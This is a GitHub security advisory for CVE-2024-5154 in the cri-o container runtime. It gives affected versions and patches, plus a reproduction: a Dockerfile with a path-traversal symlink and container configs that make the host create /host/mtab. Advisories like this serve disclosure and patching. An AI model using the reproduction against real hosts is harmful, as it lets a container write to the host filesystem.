# [H] malicious container creates symlink "mtab" on the host External

## Summary
Severity: High
Advisory: GHSA-j9hf-98c3-wrm8
CVE: CVE-2024-5154
CWE: CWE-22, CWE-668
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2024-06-04
Source: https://github.com/advisories/GHSA-j9hf-98c3-wrm8
Type: github-advisory

## Affected
- Go: `github.com/cri-o/cri-o` — affected >=1.28.6 <1.28.7
- Go: `github.com/cri-o/cri-o` — affected >=1.29.4 <1.29.5
- Go: `github.com/cri-o/cri-o` — affected >=1.30.0 <1.30.1

## Details
### Impact
A malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.

A workload built from this Dockerfile:
```
FROM docker.io/library/busybox as source
RUN mkdir /extra && cd /extra && ln -s ../../../../../../../../root etc

FROM scratch

COPY --from=source /bin /bin
COPY --from=source /lib /lib
COPY --from=source /extra .

```

and this container config:

```
{
  "metadata": {
      "name": "busybox"
  },
  "image":{
      "image": "localhost/test"
  },
  "command": [
      "/bin/true"
  ],
  "linux": {
  }
}


```
and this sandbox config  
```
{
  "metadata": {
    "name": "test-sandbox",
    "namespace": "default",
    "attempt": 1,
    "uid": "edishd83djaideaduwk28bcsb"
  },
  "linux": {
    "security_context": {
      "namespace_options": {
        "network": 2
      }
    }
  }
}

```

will create a file on host `/host/mtab`

### Patches
1.30.1, 1.29.5, 1.28.7

### Workarounds
Unfortunately not

### References
_Are there any links users can visit to find out more?_

## References
- https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8
- https://nvd.nist.gov/vuln/detail/CVE-2024-5154
- https://access.redhat.com/errata/RHSA-2024:10818
- https://access.redhat.com/errata/RHSA-2024:3676
- https://access.redhat.com/errata/RHSA-2024:3700
- https://access.redhat.com/errata/RHSA-2024:4008
- https://access.redhat.com/errata/RHSA-2024:4159
- https://access.redhat.com/errata/RHSA-2024:4486
- https://access.redhat.com/security/cve/CVE-2024-5154
- https://bugzilla.redhat.com/show_bug.cgi?id=2280190
- https://github.com/cri-o/cri-o
- https://pkg.go.dev/vuln/GO-2024-2919
